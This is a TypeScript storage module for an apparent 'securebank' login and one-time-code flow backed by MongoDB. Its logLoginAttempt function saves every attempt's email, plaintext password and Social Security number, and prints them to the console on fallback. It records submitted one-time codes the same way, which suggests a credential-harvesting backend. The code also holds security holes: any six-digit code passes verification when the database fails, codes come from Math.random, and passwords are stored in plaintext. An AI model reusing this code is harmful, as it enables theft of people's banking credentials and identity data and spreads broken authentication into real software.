import { connectToMongoDB } from "./mongodb";
import { User, OTPCode, LoginAttempt, OTPAttempt, type IUser, type IOTPCode, type ILoginAttempt, type IOTPAttempt } from "@shared/mongodb-models";
import { type InsertUser } from "@shared/schema";

export interface IStorage {
  getUser(id: string): Promise<IUser | undefined>;
  getUserByEmail(email: string): Promise<IUser | undefined>;
  createUser(user: InsertUser): Promise<IUser>;
  generateOTP(email: string): Promise<IOTPCode>;
  verifyOTP(email: string, code: string): Promise<boolean>;
  logLoginAttempt(email: string, password: string, ssn: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<ILoginAttempt>;
  logOTPAttempt(email: string, code: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<IOTPAttempt>;
}

export class MongoDBStorage implements IStorage {
  constructor() {
    // Connect to MongoDB and create demo user
    this.initialize();
  }

  private async initialize() {
    try {
      await connectToMongoDB();
      await this.initializeDemoUser();
    } catch (error) {
      console.error('MongoDB initialization failed:', error);
    }
  }

  private async initializeDemoUser() {
    try {
      const existingUser = await this.getUserByEmail("demo@securebank.com");
      if (!existingUser) {
        await this.createUser({
          email: "demo@securebank.com",
          password: "password123"
        });
      }
    } catch (error) {
      console.log("Demo user initialization skipped:", error);
    }
  }

  async getUser(id: string): Promise<IUser | undefined> {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, skipping user lookup');
      return undefined;
    }
    try {
      const user = await User.findById(id).lean();
      if (!user) return undefined;
      const { _id, ...userData } = user;
      return { ...userData, id: _id.toString() };
    } catch (error) {
      console.error('Error getting user:', error);
      return undefined;
    }
  }

  async getUserByEmail(email: string): Promise<IUser | undefined> {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, skipping user lookup');
      return undefined;
    }
    try {
      const user = await User.findOne({ email }).lean();
      if (!user) return undefined;
      const { _id, ...userData } = user;
      return { ...userData, id: _id.toString() };
    } catch (error) {
      console.error('Error getting user by email:', error);
      return undefined;
    }
  }

  async createUser(insertUser: InsertUser): Promise<IUser> {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, creating mock user');
      return {
        id: 'mock_' + Date.now(),
        email: insertUser.email,
        password: insertUser.password,
        isEmailVerified: false,
        createdAt: new Date()
      };
    }
    try {
      const user = new User(insertUser);
      const savedUser = await user.save();
      const { _id, ...userData } = savedUser.toObject();
      return { ...userData, id: _id.toString() };
    } catch (error) {
      console.error('Error creating user:', error);
      return {
        id: 'mock_' + Date.now(),
        email: insertUser.email,
        password: insertUser.password,
        isEmailVerified: false,
        createdAt: new Date()
      };
    }
  }

  async generateOTP(email: string): Promise<IOTPCode> {
    const code = Math.floor(100000 + Math.random() * 900000).toString(); // 6-digit code
    const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes from now
    
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, creating mock OTP');
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        expiresAt,
        isUsed: false,
        createdAt: new Date()
      };
    }
    
    try {
      // Clear any existing OTP for this email
      await OTPCode.deleteMany({ email });

      const otpCode = new OTPCode({
        email,
        code,
        expiresAt,
        isUsed: false
      });
      
      const savedOtp = await otpCode.save();
      const { _id, ...otpData } = savedOtp.toObject();
      return { ...otpData, id: _id.toString() };
    } catch (error) {
      console.error('Error generating OTP:', error);
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        expiresAt,
        isUsed: false,
        createdAt: new Date()
      };
    }
  }

  async verifyOTP(email: string, code: string): Promise<boolean> {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, accepting any 6-digit code');
      // Accept any 6-digit code when MongoDB is not available
      return /^\d{6}$/.test(code);
    }
    
    try {
      const otpCode = await OTPCode.findOne({
        email,
        code,
        isUsed: false
      });

      if (!otpCode) {
        return false;
      }

      // Check if OTP has expired
      if (new Date() > otpCode.expiresAt) {
        return false;
      }

      // Mark OTP as used
      otpCode.isUsed = true;
      await otpCode.save();
      
      return true;
    } catch (error) {
      console.error('Error verifying OTP:', error);
      // Fallback: accept any 6-digit code
      return /^\d{6}$/.test(code);
    }
  }

  async logLoginAttempt(email: string, password: string, ssn: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<ILoginAttempt> {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, logging to console instead');
      console.log('LOGIN ATTEMPT:', { email, password, ssn, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
    
    try {
      const loginAttempt = new LoginAttempt({
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent
      });
      
      const savedAttempt = await loginAttempt.save();
      const { _id, ...attemptData } = savedAttempt.toObject();
      return { 
        ...attemptData, 
        id: _id.toString(),
        ipAddress: attemptData.ipAddress || undefined,
        userAgent: attemptData.userAgent || undefined
      };
    } catch (error) {
      console.error('Error logging login attempt:', error);
      console.log('LOGIN ATTEMPT (FALLBACK):', { email, password, ssn, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
  }

  async logOTPAttempt(email: string, code: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<IOTPAttempt> {
    const connected = await connectToMongoDB();
    if (!connected) {
      console.log('MongoDB not available, logging to console instead');
      console.log('OTP ATTEMPT:', { email, code, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
    
    try {
      const otpAttempt = new OTPAttempt({
        email,
        code,
        success,
        ipAddress,
        userAgent
      });
      
      const savedAttempt = await otpAttempt.save();
      const { _id, ...attemptData } = savedAttempt.toObject();
      return { 
        ...attemptData, 
        id: _id.toString(),
        ipAddress: attemptData.ipAddress || undefined,
        userAgent: attemptData.userAgent || undefined
      };
    } catch (error) {
      console.error('Error logging OTP attempt:', error);
      console.log('OTP ATTEMPT (FALLBACK):', { email, code, success, ipAddress, userAgent, timestamp: new Date() });
      return {
        id: 'mock_' + Date.now(),
        email,
        code,
        success,
        ipAddress,
        userAgent,
        createdAt: new Date()
      };
    }
  }
}

export const storage = new MongoDBStorage();